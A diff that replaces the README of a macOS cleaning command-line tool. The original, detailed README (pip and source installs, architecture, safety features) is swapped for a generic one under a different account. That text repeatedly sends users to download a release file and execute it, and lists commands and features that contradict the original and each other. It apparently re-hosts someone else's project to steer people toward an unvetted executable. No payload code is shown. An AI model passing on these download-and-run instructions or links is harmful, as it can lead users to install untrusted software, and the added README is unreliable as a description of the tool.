@@ -1,219 +1,89 @@
-# 🍎 macOS Cleaner
+# MacCleanCLI 🧹
 
-<img width="1737" alt="Image" src="https://github.com/user-attachments/assets/fdeb8a4e-3d95-4408-9e4b-484ee47000a7" />
+![MacCleanCLI](https://img.shields.io/badge/MacCleanCLI-v1.0.0-blue?style=for-the-badge)
 
+Welcome to **MacCleanCLI**, a powerful command-line application tailored for macOS users. This tool simplifies disk cleanup and system optimization, all from your terminal. If you're looking to free up space and enhance your Mac's performance, you've come to the right place.
 
-A beautiful and efficient console application for cleaning and optimizing macOS systems.
+## Table of Contents
 
-![Python Version](https://img.shields.io/badge/python-3.10%2B-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Platform](https://img.shields.io/badge/platform-macOS-lightgrey)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-## ✨ Features
+## Features
 
-- **🔍 Smart Scanning**: Intelligently identifies unnecessary files across your system
-- **🧹 Safe Cleaning**: Removes only safe-to-delete files with backup options
-- **⚡ System Optimization**: Memory purging, DNS flushing, and startup item management
-- **🎨 Beautiful UI**: Rich console interface with colors, progress bars, and animations
-- **🛡️ Safety First**: Built-in protections and confirmation prompts
-- **📊 Detailed Reports**: Comprehensive scan results and cleaning summaries
+- **Disk Cleanup**: Remove unnecessary files, caches, and logs to reclaim valuable disk space.
+- **System Optimization**: Optimize your system settings for better performance.
+- **User-Friendly**: Interactive command-line interface for easy navigation and use.
+- **Efficient**: Designed to perform tasks quickly and effectively.
+- **Cross-Platform**: Built specifically for macOS, ensuring seamless integration with the system.
 
-## 📋 Supported Cleaning Categories
+## Installation
 
-- **System & User Caches**: Clear application and system cache files
-- **Browser Caches**: Remove browser temporary files
-- **Temporary Files**: Clean up system temporary directories
-- **Log Files**: Remove old log files
-- **Downloads**: Identify old files in Downloads folder
-- **Trash**: Empty system trash
-- **Duplicate Files**: Find and remove duplicate files
-- **Large Files**: Identify unusually large files
-- **Old Files**: Find files not accessed in months
-- **App Leftovers**: Remove files from uninstalled applications
+To get started with MacCleanCLI, you need to download the latest release. You can find it [here](https://github.com/Prigrammess/MacCleanCLI/releases). Download the file and execute it on your terminal.
 
-## 🚀 Installation
+### Prerequisites
 
-### Using pip
+- macOS 10.14 or later
+- Python 3.6 or later
 
+### Steps
+
+1. Download the latest release from the [Releases section](https://github.com/Prigrammess/MacCleanCLI/releases).
+2. Open your terminal.
+3. Navigate to the directory where you downloaded the file.
+4. Run the application using the command:
+   ```bash
+   python3 MacCleanCLI.py
+   ```
+
+## Usage
+
+Once you have installed MacCleanCLI, you can start using it right away. Simply run the command mentioned above to launch the application. The interface will guide you through the available options.
+
+### Example
+
+To perform a basic disk cleanup, you can enter the following command:
 ```bash
-pip install mac-clean-cli
+cleanup --basic
 ```
 
-### Using Homebrew (coming soon)
+This command will initiate a quick scan and remove unnecessary files.
 
-```bash
-brew install mac-clean-cli
-```
+## Commands
 
-### From Source
+Here’s a list of commands you can use with MacCleanCLI:
 
-```bash
-git clone https://github.com/qdenka/MacCleanCLI.git
-cd MacCleanCLI
-pip install -e .
-```
+| Command              | Description                                 |
+|----------------------|---------------------------------------------|
+| `cleanup --basic`    | Performs a basic cleanup.                   |
+| `cleanup --full`     | Conducts a thorough cleanup of your system.|
+| `optimize --performance` | Optimizes system settings for speed.     |
+| `status`             | Displays current disk usage and status.     |
+| `help`               | Shows available commands and options.       |
 
-## 📖 Usage
+## Contributing
 
-### Basic Usage
+We welcome contributions from the community. If you want to help improve MacCleanCLI, follow these steps:
 
-```bash
-# Run interactive mode
-mac-clean
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Open a pull request detailing your changes.
 
-# Or use the short alias
-mclean
-```
+## License
 
-### Command Line Options
+MacCleanCLI is licensed under the MIT License. Feel free to use, modify, and distribute the software.
 
-```bash
-# Scan only, don't clean
-mac-clean --scan-only
+## Support
 
-# Automatic mode (clean recommended items)
-mac-clean --auto
+If you have any questions or need assistance, check the [Releases section](https://github.com/Prigrammess/MacCleanCLI/releases) for updates. You can also open an issue in the repository for help.
 
-# Use custom config file
-mac-clean --config ~/myconfig.json
+---
 
-# Enable verbose output
-mac-clean --verbose
-```
-
-## 🎮 Interactive Mode
-
-The interactive mode provides a user-friendly menu system:
-
-1. **Scan System**: Choose categories to scan
-2. **Clean Files**: Select and clean identified files
-3. **Optimize System**: Run system optimization tasks
-4. **Settings**: Configure application behavior
-
-## ⚙️ Configuration
-
-Configuration file is stored at `~/.MacCleanCLI/config.json`
-
-### Key Settings
-
-```json
-{
-  "dry_run": false,
-  "enable_backup": true,
-  "verify_cleaning": true,
-  "remove_empty_dirs": true,
-  "max_workers": 4,
-  "backup_retention_days": 7
-}
-```
-
-## 🛡️ Safety Features
-
-- **Protected Paths**: System-critical directories are never touched
-- **Backup System**: Optional backup before deletion
-- **Dry Run Mode**: Preview what would be deleted without actually removing files
-- **Confirmation Prompts**: Require user confirmation for destructive operations
-- **Verification**: Post-cleaning verification of file removal
-
-## 🏗️ Architecture
-
-The application follows SOLID principles and clean architecture:
-
-```
-MacCleanCLI/
-├── main.py              # Entry point
-├── core/               # Core business logic
-│   ├── scanner.py      # System scanning
-│   ├── cleaner.py      # File cleaning
-│   └── optimizer.py    # System optimization
-├── models/             # Data models
-│   └── scan_result.py  # Result structures
-├── ui/                 # User interface
-│   ├── interface.py    # Main UI logic
-│   └── components.py   # UI components
-└── utils/              # Utilities
-    ├── config.py       # Configuration
-    ├── logger.py       # Logging
-    └── backup.py       # Backup management
-```
-
-## 🔧 Development
-
-### Setup Development Environment
-
-```bash
-# Clone the repository
-git clone https://github.com/qdenka/MacCleanCLI.git
-cd MacCleanCLI
-
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate
-
-# Install development dependencies
-pip install -r requirements.txt
-pip install -e .
-```
-
-### Running Tests
-
-```bash
-# Run all tests
-pytest
-
-# Run with coverage
-pytest --cov=.
-
-# Run specific test file
-pytest tests/test_scanner.py
-```
-
-### Code Style
-
-```bash
-# Format code
-black .
-
-# Check linting
-flake8 .
-
-# Type checking
-mypy .
-```
-
-## 📊 Performance
-
-- **Multi-threaded scanning**: Utilizes multiple CPU cores for faster scanning
-- **Efficient file operations**: Batch operations for improved performance
-- **Memory efficient**: Streams large files instead of loading into memory
-- **Progress indication**: Real-time progress updates during operations
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the project
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Built with [Rich](https://github.com/Textualize/rich) for beautiful terminal UI
-- Uses [psutil](https://github.com/giampaolo/psutil) for system information
-- Inspired by various macOS cleaning utilities
-
-## ⚠️ Disclaimer
-
-This software is provided as-is. Always ensure you have backups of important data before running system cleaning operations. The authors are not responsible for any data loss.
-
-## 📞 Support
-
-- **Issues**: [GitHub Issues](https://github.com/qdenka/MacCleanCLI/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/macos/MacCleanCLI/discussions)
-- **Wiki**: [Documentation Wiki](https://github.com/macos/MacCleanCLI/wiki)
+Thank you for using MacCleanCLI! Enjoy a cleaner and faster macOS experience.
